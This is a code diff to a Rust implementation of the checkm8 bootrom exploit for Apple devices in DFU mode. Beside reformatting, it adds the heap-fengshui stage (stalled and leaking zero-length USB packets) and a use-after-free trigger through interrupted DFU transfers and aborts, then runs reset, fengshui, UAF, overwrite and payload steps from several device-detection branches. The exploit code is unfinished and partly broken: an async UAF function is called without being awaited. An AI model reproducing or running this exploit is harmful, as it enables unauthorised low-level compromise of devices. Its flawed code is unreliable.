@@ -3,9 +3,9 @@ use rusb::{self, DeviceDescriptor, UsbContext};
 use rusty_libimobiledevice::idevice;
 use rusty_libimobiledevice::services::lockdownd;
 use std::ffi::{c_uchar, c_uint, c_ushort, c_void};
-use std::{future, ptr};
 use std::thread::sleep;
 use std::time::{Duration, Instant};
+use std::{ptr};
 use tokio;
 
 // MARK: constants
@@ -248,7 +248,9 @@ fn send_usb_control_request_no_data(
             0,
         )
     } else {
-        let mut data: *mut c_void = unsafe { std::alloc::alloc(std::alloc::Layout::from_size_align(w_length, 1).unwrap()) } as *mut c_void;
+        let mut data: *mut c_void =
+            unsafe { std::alloc::alloc(std::alloc::Layout::from_size_align(w_length, 1).unwrap()) }
+                as *mut c_void;
         if !data.is_null() {
             unsafe {
                 std::ptr::write_bytes(data as *mut c_uchar, 0, w_length);
@@ -262,7 +264,12 @@ fn send_usb_control_request_no_data(
                 data,
                 w_length as c_ushort,
             );
-            unsafe { std::alloc::dealloc(data as *mut u8, std::alloc::Layout::from_size_align(w_length, 1).unwrap()) };
+            unsafe {
+                std::alloc::dealloc(
+                    data as *mut u8,
+                    std::alloc::Layout::from_size_align(w_length, 1).unwrap(),
+                )
+            };
             result
         } else {
             false
@@ -304,22 +311,21 @@ async fn send_usb_control_request_async(
     w_length: c_ushort,
     usb_abort_timeout: u16,
 ) -> bool {
-    
     let start = Instant::now();
 
     let result = async {
         unsafe {
-        libusb_control_transfer(
-            handle.as_raw(),
-            bm_request_type,
-            b_request,
-            w_value,
-            w_index,
-            data as *mut std::os::raw::c_uchar,
-            w_length,
-            usb_abort_timeout.into(),
-        )
-    }
+            libusb_control_transfer(
+                handle.as_raw(),
+                bm_request_type,
+                b_request,
+                w_value,
+                w_index,
+                data as *mut std::os::raw::c_uchar,
+                w_length,
+                usb_abort_timeout.into(),
+            )
+        }
     }
     .await;
 
@@ -346,17 +352,17 @@ async fn send_usb_control_request_async_no_data(
     if w_length == 0 {
         let result = async {
             unsafe {
-            libusb_control_transfer(
-                handle.as_raw(),
-                bm_request_type,
-                b_request,
-                w_value,
-                w_index,
-                std::ptr::null_mut(),
-                0,
-                usb_abort_timeout.into(),
-            )
-        }
+                libusb_control_transfer(
+                    handle.as_raw(),
+                    bm_request_type,
+                    b_request,
+                    w_value,
+                    w_index,
+                    std::ptr::null_mut(),
+                    0,
+                    usb_abort_timeout.into(),
+                )
+            }
         }
         .await;
 
@@ -371,17 +377,17 @@ async fn send_usb_control_request_async_no_data(
         let mut data = vec![0u8; w_length];
         let result = async {
             unsafe {
-            libusb_control_transfer(
-                handle.as_raw(),
-                bm_request_type,
-                b_request,
-                w_value,
-                w_index,
-                data.as_mut_ptr() as *mut std::os::raw::c_uchar,
-                w_length as c_ushort,
-                usb_abort_timeout.into(),
-            )
-        }
+                libusb_control_transfer(
+                    handle.as_raw(),
+                    bm_request_type,
+                    b_request,
+                    w_value,
+                    w_index,
+                    data.as_mut_ptr() as *mut std::os::raw::c_uchar,
+                    w_length as c_ushort,
+                    usb_abort_timeout.into(),
+                )
+            }
         }
         .await;
 
@@ -428,14 +434,7 @@ fn reset_device(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
         // Send zero length packet to end existing transfer
 
         // Request image validation like we are about to boot it
-        send_usb_control_request_no_data(
-            usb_handle,
-            0x21,
-            DFU_DNLOAD,
-            0,
-            0,
-            0, 
-        );
+        send_usb_control_request_no_data(usb_handle, 0x21, DFU_DNLOAD, 0, 0, 0);
         // return send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, &transfer_ret)
 
         // Start a new DFU transfer
@@ -462,13 +461,60 @@ fn stall_usb_request(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
     send_usb_control_request_no_data(usb_handle, 0x2, DFU_GETSTATUS, 0, 0x80, 0);
 }
 
-fn checkm8_stall(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
-    let usb_abort_timeout = 10;
-    // while (send)
+fn checkm8_send_leaking_zlp(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
+    send_usb_control_request_no_data(usb_handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40);
 }
 
-fn heap_fengshui(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
+fn checkm8_send_normal_zlp(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
+    send_usb_control_request_no_data(usb_handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1);
+}
+
+async fn checkm8_stall(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
+    let mut usb_abort_timeout = 10;
+    let mut counter = 0;
+    while (send_usb_control_request_async_no_data(
+        usb_handle,
+        0x80,
+        DFU_ABORT,
+        0x304,
+        0xA,
+        0xC0,
+        usb_abort_timeout,
+    ))
+    .await
+    {
+        // shorten timer to hopefully abort the transfer halfway thru
+        send_usb_control_request_async_no_data(usb_handle,
+            0x80,
+            DFU_ABORT,
+            0x304,
+            0xA,
+            0x40,
+            1
+        ).await;
+        usb_abort_timeout = (usb_abort_timeout + 1) % 10;
+        if counter < 500 {
+            counter += 1;
+        } else {
+            break;
+        }
+    }
+}
+
+async fn heap_fengshui(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
     println!("Stage 1: heap fengshui");
+    checkm8_stall(usb_handle).await;
+    // Leak one zlp and stall the endpoint.
+    println!("Sending zero length packets");
+    // Send enough packets to fill the hole
+    let mut config_hole = 5;
+    while (config_hole > 0) {
+        // println!("ZLP");
+        checkm8_send_normal_zlp(usb_handle);
+        config_hole -=1;
+    }
+    // Add another leaking packet the end of the hole
+    checkm8_send_leaking_zlp(usb_handle);
 }
 
 fn send_abort(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
@@ -479,7 +525,7 @@ fn send_abort(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
     // send_usb_control_request_no_data(handle, 0x21, 0x4, 0, 0, 0, NULL);
 }
 
-fn trigger_uaf(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
+async fn trigger_uaf(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
     //     1. Start a **control request transfer** with **data phase**
     // 	        1. Interrupt the transfer halfway
     //     2. Issue a **DFU abort** (0x21, 4), which frees the USB buffer
@@ -487,10 +533,25 @@ fn trigger_uaf(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
     //     3. Finish the interrupted transfer.
     // 	        1. **Send data phase packets** once DFU is re-entered.
     //     4. The data will be `memcpy`d on top of the freed pointer.
-
     println!("Stage 2: trigger uaf");
-
+    let mut usb_timeout = 10;
+    while (send_usb_control_request_async_no_data(
+        usb_handle,
+        0x21,
+        DFU_DNLOAD,
+        0,
+        0,
+        2048,
+        usb_timeout)
+    ).await {
+        // overwrite padding
+        println!("overwrite padding");
+        send_usb_control_request_no_data(usb_handle, 0, 0, 0, 0,  0x5c0 - 10); // overwritePadding
+    }
+    
     send_abort(&usb_handle);
+    usb_timeout = (usb_timeout + 1) % 10;
+    
 }
 
 fn overwrite(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
@@ -511,7 +572,7 @@ async fn main() {
         Some(device) = find_device_in_dfu_task => {
             let device_handle = device.open().unwrap();
             reset_device(&device_handle);
-            heap_fengshui(&device_handle);
+            heap_fengshui(&device_handle).await;
             trigger_uaf(&device_handle);
             overwrite(&device_handle);
             send_payload(&device_handle);
@@ -519,10 +580,22 @@ async fn main() {
         Some(device) = find_device_in_recovery_task => {
             let device_handle = device.open().unwrap();
             dfu_helper(&device_handle);
+            // let device_handle = device.open().unwrap();
+            reset_device(&device_handle);
+            heap_fengshui(&device_handle).await;
+            trigger_uaf(&device_handle);
+            overwrite(&device_handle);
+            send_payload(&device_handle);
         }
         Some(device) = find_apple_device_task => {
             kick_into_recovery().await;
             dfu_helper(&device);
+            let device_handle = device.open().unwrap();
+            reset_device(&device_handle);
+            heap_fengshui(&device_handle).await;
+            trigger_uaf(&device_handle);
+            overwrite(&device_handle);
+            send_payload(&device_handle);
         }
         else => {
             // Handle the case where none of the tasks succeed
